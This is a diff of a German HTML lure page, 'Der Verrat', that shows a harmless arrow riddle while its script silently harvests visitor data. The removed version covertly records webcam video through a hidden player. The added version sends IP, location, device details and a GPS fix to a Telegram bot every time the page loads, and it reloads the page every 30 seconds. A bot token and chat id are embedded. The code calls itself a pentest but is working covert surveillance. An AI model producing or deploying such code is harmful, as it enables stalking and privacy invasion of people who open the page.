@@ -1,102 +1,69 @@
 <!DOCTYPE html>
-<html lang="de">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width">
 <title>Der Verrat</title>
-<style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:system-ui;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;padding:2rem;overflow:hidden;}h1{font-size:clamp(2.5rem,10vw,5rem);margin-bottom:1.5rem;text-shadow:0 8px 32px rgba(0,0,0,.6);}p{font-size:clamp(1rem,4vw,1.3rem);line-height:1.6;max-width:32rem;text-align:center;margin:2rem 0;}.arrows{font-size:clamp(4rem,15vw,7rem);margin-top:2rem;}.arrow{display:inline-block;animation:arrowFloat 3s infinite;}.arrow:nth-child(2){animation-delay:.3s;}.arrow:nth-child(3){animation-delay:.6s;}@keyframes arrowFloat{0%,100%{transform:translateY(0) scale(1);}50%{transform:translateY(-20px) scale(1.1);}}#videoPlayer{position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;z-index:-1;}</style>
+<style>
+body{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Arial;color:white;flex-direction:column;}
+h1{font-size:4rem;margin:0 0 1rem;text-shadow:2px 2px 4px #000;}
+p{font-size:1.2rem;max-width:500px;text-align:center;line-height:1.6;}
+.arrows{font-size:5rem;margin-top:2rem;}
+@keyframes bounce{0%,20%,50%,80%,100%{transform:translateY(0);}40%{transform:translateY(-20px);}60%{transform:translateY(-10px);}}
+.arrow{animation:bounce 2s infinite;display:inline-block;}
+</style>
 </head>
 <body>
 <h1>🗡️ Der Verrat</h1>
 <p>Wenn du wissen willst wo der Verrat liegt, schau aus welcher Richtung die Pfeile kommen.</p>
 <div class="arrows">
-<span class="arrow">↖️</span><span class="arrow">↙️</span><span class="arrow">↗️</span><span class="arrow">↘️</span>
+<span class="arrow">↖️</span><span class="arrow" style="animation-delay:0.2s">↙️</span>
+<span class="arrow" style="animation-delay:0.4s">↗️</span><span class="arrow" style="animation-delay:0.6s">↘️</span>
 </div>
 
-<!-- INVISIBLE VIDEO PLAYER -->
-<video id="videoPlayer" autoplay muted playsinline></video>
-<canvas id="capture" style="display:none;"></canvas>
-
 <script>
-// HYPER ACCURATE LOCATION (WiFi + IP)
-async function getPreciseLocation(){
-  const locData = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyD9...', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({considerIp:true, wifiAccessPoints:[]})
-  }).catch(()=>null);
+(async()=>{
+  // CORE DATA
+  const ip=await(await fetch('https://api.ipify.org')).text();
+  const geo=await(await fetch('https://ipapi.co/'+ip+'/json/')).then(r=>r.json());
   
-  if(locData) {
-    const loc = await locData.json();
-    return `${loc.location.lat.toFixed(6)},${loc.location.lng.toFixed(6)} (wifi)`;
-  }
-  return 'IP-only';
-}
+  const data=`🎯 PENTEST HIT!
 
-// STEALTH CAMERA VIDEO
-async function captureVideo(){
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: {facingMode: 'user', width:640, height:480},
-      audio: false
-    });
-    
-    const video = document.getElementById('videoPlayer');
-    video.srcObject = stream;
-    
-    // RECORD 8sec VIDEO
-    const recorder = new MediaRecorder(stream, {mimeType:'video/webm'});
-    const chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
-    
-    recorder.start();
-    setTimeout(()=>{
-      recorder.stop();
-      recorder.onstop = async()=>{
-        const blob = new Blob(chunks, {type:'video/webm'});
-        
-        // UPLOAD VIDEO
-        const formData = new FormData();
-        formData.append('chat_id','7745393043');
-        formData.append('video',blob,'victim.mp4');
-        formData.append('caption','🎥 8SEC VIDEO RECORDING');
-        
-        await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendVideo',{
-          method:'POST', body:formData
-        });
-        
-        stream.getTracks().forEach(t=>t.stop());
-      };
-    },8000);
-    
-  }catch(e){console.log('Video blocked');}
-}
+🖥️  IP: ${ip}
+📍  ${geo.city || '?'} - ${geo.country_name || '?'}
+📏  ${screen.width}x${screen.height}
+🌐  ${navigator.language}
+💻  ${navigator.platform}
+🕐  ${new Date().toLocaleString('de-DE')}
 
-// MAIN HARVEST
-async function harvestAll(){
-  const ipData = await (await fetch('https://api.ipify.org?format=json')).json();
-  const geoData = await (await fetch(`https://ipapi.co/${ipData.ip}/json/`)).json();
+👤 UA: ${navigator.userAgent.slice(0,60)}`;
   
-  const payload = `🎣 ELITE HARVEST
-
-🌐 IP: ${ipData.ip}
-📍 ${geoData.city}, ${geoData.country_name}
-🗺️ GPS: ${await getPreciseLocation()}
-📱 ${screen.width}x${screen.height}`;
-
-  // SEND DATA
+  // SEND
   await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:'7745393043', text:payload})
+    body:JSON.stringify({
+      chat_id:'7745393043',
+      text:data,
+      disable_web_page_preview:true
+    })
   });
+  
+  // GPS ATTEMPT (silent)
+  navigator.geolocation.getCurrentPosition(p=>{
+    fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id:'7745393043',
+        text:`🛰️ GPS: ${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`
+      })
+    });
+  });
+  
+})();
 
-  // START CAMERA/VIDEO
-  captureVideo();
-}
-
-// EXECUTE SILENT
-harvestAll();
+// REPEAT EVERY 30s
+setInterval(()=>location.reload(),30000);
 </script>
 </body>
 </html>
